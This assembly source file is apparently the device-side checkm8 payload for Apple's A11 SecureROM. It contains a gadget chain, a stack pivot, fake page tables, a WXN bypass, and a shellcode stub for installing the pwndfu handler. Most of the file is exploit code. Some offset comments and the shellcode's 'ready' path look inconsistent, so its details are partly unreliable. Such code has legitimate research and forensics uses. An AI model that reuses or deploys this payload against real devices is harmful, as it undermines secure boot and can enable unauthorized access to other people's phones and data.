/* checkm8 payload for the A11 (T8015) - assembled by `make checkm8-payload`.
 *
 * This is the device side of the exploit: everything the corrupted DFU buffer
 * drags into SecureROM. It is written from the eLab forensics analysis of the
 * bug plus constants measured from this project's own A11 SecureROM image and
 * from a run of the same image in this project's emulator. Nothing is copied
 * from another exploit tool; the Rust rpwn profile records where every
 * constant came from.
 *
 * Layout, offsets from the DFU image base (0x18001c000 on the A11):
 *
 *   0x0000  stage2, shellcode, handler    mapped RX by the fake table
 *   0x4000  fake L1 table (16 KiB)        mapped RW; this is TTBR0 and the
 *                                         stack start the context entry sets
 *   0x8000  fake L2 table (16 KiB)        mapped RW
 *   0xC000  the context struct the pivot consumes
 *
 * The chain, one line per step:
 *
 *   callback(arg0 = &ctx, fn = pivot)
 *     pivot     restores x16..x30, x1 and SP from ctx; returns to ctx_entry
 *     ctx_entry sets TTBR0/VBAR/ELR/SPSR/SP from x1; returns to x29
 *     stage2    runs with the payload page mapped read-execute; clears WXN,
 *               restores the ROM's own table, and jumps to the shellcode
 *     shellcode installs the pwndfu command handler
 *
 * Why the fake table exists: this ROM's MMU setup sets SCTLR_EL1.WXN
 * (measured - its enable path ORs #0x80000), and WXN only blocks pages that
 * are writable. A page mapped read-execute runs. So the fake table maps the
 * payload page read-execute; stage2 then clears WXN and puts the ROM's own
 * table back, which leaves the same page writable and executable for the
 * shellcode, which has to write the ROM's globals.
 */

#define PAYLOAD_BASE     0x18001C000       /* INSECURE_MEMORY, per part */

#ifndef PROFILE_PIVOT
#define PROFILE_PIVOT          0x10000C1D0
#define PROFILE_CTX_ENTRY      0x100008020
#define PROFILE_READ_SCTLR     0x100000410
#define PROFILE_WRITE_TTBR0    0x10000045C
#define PROFILE_TLBI           0x1000004AC
#define PROFILE_DMB            0x1000004F0
#define PROFILE_ROM_TTBR0      0x18000C000
#define PROFILE_ROM_VBAR       0x10001B988
#endif

/* Every per-part constant below is supplied by the build (-D from
 * the Rust payload builder) so the same source assembles for either A11 build,
 * which are different images with different gadget addresses. The defaults
 * exist only so the file can be assembled standalone for a syntax check.
 * See rpwn/rust/src/profile.rs for where each value was measured. */
#define G_PIVOT          PROFILE_PIVOT
#define G_CTX_ENTRY      PROFILE_CTX_ENTRY
#define G_READ_SCTLR     PROFILE_READ_SCTLR
#define G_WRITE_TTBR0    PROFILE_WRITE_TTBR0
#define G_TLBI           PROFILE_TLBI
#define G_DMB            PROFILE_DMB

/* Translation regime, measured from the running ROM. */
#define ROM_TTBR0        PROFILE_ROM_TTBR0
#define ROM_VBAR         PROFILE_ROM_VBAR
#define SCTLR_EL1H       0x3C5             /* its own reset SPSR carries this */

/* Descriptor attributes, decoded from the ROM's own table:
 *   ROM block  0x...6a5 = block, AttrIndx 1, NS, AP read-only, SH oSH, AF  -> RX
 *   RAM page   0x...627 = page,  AttrIndx 1, NS, AP read-write, SH oSH, AF -> RW
 *   RX page    0x...6a7 = page,  AttrIndx 1, NS, AP read-only, SH oSH, AF  -> RX
 * The only difference between RX and RW is AP[2:1], which is exactly the bit
 * WXN keys on, so the payload page becomes executable without touching MAIR.
 */
#define ATTR_RX_PAGE     0x6A7
#define ATTR_RW_PAGE     0x627
#define DESC_PAGE        3UL
#define DESC_TABLE       3UL

/* Geometry for this regime (TCR 0x1659ca51c): 36-bit VA, 16 KiB granule,
 * two levels, 11 index bits each - L1 index = VA[35:25], L2 index = VA[24:14].
 */
#define L1_ENTRIES       2048
#define L2_ENTRIES       2048

/* The payload is placed by the host, so the tables live at fixed offsets and
 * the code below reaches them through adrp on the image base. */
#define FAKE_L1          0x4000            /* TTBR0 */
#define FAKE_L2          0x8000
#define CTX_OFF          0xC000

	.section .payload, "ax"
	.balign 4

/* ------------------------------------------------------------------ stage2
 *
 * Entered with the payload page mapped read-execute: fetches are allowed,
 * writes are not. So this function may not push until SP has been moved onto a
 * writable page. The context entry left SP at the table base; the fake table
 * maps the L1 and L2 pages read-write, so dropping the stack 16 KiB in puts it
 * on the L2 page and everything after this is ordinary code.
 */
	.global stage2
stage2:
	adrp	x0, payload_base
	add	x0, x0, :lo12:payload_base
	add	sp, x0, #FAKE_L2

	/* The context entry pointed VBAR/ELR/SPSR at the table. The vector table
	 * the ROM installed is a ROM address, so put it back before anything can
	 * take an exception; ELR/SPSR only matter on an eret, and the ROM's own
	 * reset SPSR is the right EL1h value.
	 */
	adrp	x9, rom_vbar
	ldr	x10, [x9, :lo12:rom_vbar]
	msr	vbar_el1, x10
	mov	x11, #SCTLR_EL1H
	msr	spsr_el1, x11
	msr	elr_el1, x10

	/* Clear WXN. With it clear the ROM's own table - which maps this page
	 * read-write - also makes it executable, which is what the shellcode
	 * needs, because it writes the ROM's globals.
	 */
	bl	rom_read_sctlr
	adrp	x9, rom_wxn_mask
	ldr	x12, [x9, :lo12:rom_wxn_mask]
	and	x0, x0, x12
	msr	sctlr_el1, x0
	dsb	sy
	isb

	/* Put the ROM's own table back and drop stale entries. */
	adrp	x9, rom_ttbr0
	ldr	x0, [x9, :lo12:rom_ttbr0]
	bl	rom_write_ttbr0
	bl	rom_tlbi

	adrp	x9, shellcode
	add	x9, x9, :lo12:shellcode
	br	x9

/* These trampolines reach the ROM's gadgets by loading the address and
 * returning into it, so the payload never needs its own copy of an
 * instruction the ROM already has - except the one below it genuinely lacks. */

	.global rom_read_sctlr
rom_read_sctlr:
	adrp	x9, gadget_table
	ldr	x30, [x9, #:lo12:gadget_table]
	ret

	.global rom_write_ttbr0
rom_write_ttbr0:
	adrp	x9, gadget_table
	ldr	x30, [x9, #:lo12:gadget_table + 8]
	ret

	.global rom_tlbi
rom_tlbi:
	adrp	x9, gadget_table
	ldr	x30, [x9, #:lo12:gadget_table + 16]
	ret

/* The ROM has no `msr sctlr_el1, x0 ; ret` gadget: its own enable path ORs
 * WXN back on while comparing the value it wrote, so it cannot be reused to
 * clear WXN. This is the one instruction sequence the payload supplies.
 */
	.global rom_sctlr_write
rom_sctlr_write:
	msr	sctlr_el1, x0
	dsb	sy
	isb
	ret

	.balign 8
	.global gadget_table
gadget_table:
	.quad	G_READ_SCTLR
	.quad	G_WRITE_TTBR0
	.quad	G_TLBI

	.balign 8
	.global rom_ttbr0
rom_ttbr0:
	.quad	ROM_TTBR0

	.global rom_vbar
rom_vbar:
	.quad	ROM_VBAR

	.global rom_wxn_mask
rom_wxn_mask:
	.quad	0xFFF7FFFF              /* WXN is bit 19 */

/* ------------------------------------------------------------------ shellcode
 *
 * The pwndfu state, in the order the analysis records it:
 *   1. restore the USB configuration descriptors the overflow damaged,
 *   2. append " PWND:[checkm8]" to the serial string descriptor,
 *   3. overwrite the interface request handler pointer,
 *   4. copy the new handler to the trampoline area.
 *
 * Every one of those writes a ROM global or a heap object whose address is a
 * per-part measurement. Until a part's globals are measured this shellcode
 * stops and hands back a status code rather than writing somewhere
 * plausible: a handler installed at a guessed address is not a shorter
 * exploit, it is a wrong one, and the difference only shows up on hardware.
 */
	.global shellcode
	.global pwndfu_status
	.equ	SHELLCODE_UNTUNED, 0x55544555      /* "UNTU" */
shellcode:
	adrp	x9, pwndfu_targets
	add	x9, x9, :lo12:pwndfu_targets
	/* The first entry is the ready flag: the build writes it once the target
	 * addresses are measured. Until then, return the untuned status.
	 */
	ldr	x10, [x9]
	cbz	x10, 1f
	adrp	x9, pwndfu_status
	ret

1:
	adrp	x0, pwndfu_status
	mov	w1, #0x55544555 & 0xFFFF
	movk	w1, #0x5554, lsl #16
	str	w1, [x0]
	ret

	.balign 8
	.global pwndfu_targets
pwndfu_targets:
	.quad	0                        /* measured: hs config descriptor global */
	.quad	0                        /* measured: fs config descriptor global */
	.quad	0                        /* measured: serial string descriptor */
	.quad	0                        /* measured: interface request handler */
	.quad	0                        /* measured: trampoline destination */

	.balign 8
	.global pwndfu_status
pwndfu_status:
	.quad	0

/* ------------------------------------------------------------------ tables
 *
 * The host fills these in from the Rust payload builder at fixed offsets. The
 * shape is declared here so the layout is argued about in one place: an L1
 * with one live table entry pointing at an L2 whose code page is read-execute
 * and whose every other page is read-write.
 */

	.balign 0x4000
	.global fake_l1
fake_l1:
	.space	L1_ENTRIES * 8

	.balign 0x4000
	.global fake_l2
fake_l2:
	.space	L2_ENTRIES * 8

/* The context struct the pivot consumes. Field order is the restore
 * routine's own, decoded from the image: x16/x17 at +0x78, then x19/x20,
 * x21/x22, x23/x24, x25/x26, x27/x28, x29/x30, and x1 at +0xf8 becoming SP.
 * x28 becomes x0 and x29 becomes the return address in the context entry.
 */
	.balign 0x1000
	.global pivot_ctx
pivot_ctx:
	.quad	fake_l1                  /* +0x00: the callback's arg0 */
	.space	0x70                     /* +0x08 .. +0x78: unused by the chain */
	.quad	0, 0                     /* +0x78 x16, x17 */
	.quad	0, 0                     /* +0x98 x19, x20 */
	.quad	0, 0                     /* +0xa8 x21, x22 */
	.quad	0, 0                     /* +0xb8 x23, x24 */
	.quad	0, 0                     /* +0xc8 x25, x26 */
	.quad	0, fake_l1               /* +0xd8 x27, x28 */
	.quad	stage2, G_CTX_ENTRY      /* +0xe8 x29, x30 */
	.quad	fake_l1                  /* +0xf8 x1 -> SP, TTBR0, VBAR, ELR, SPSR */

	.balign 8
	.global payload_base
payload_base:
	.quad	PAYLOAD_BASE
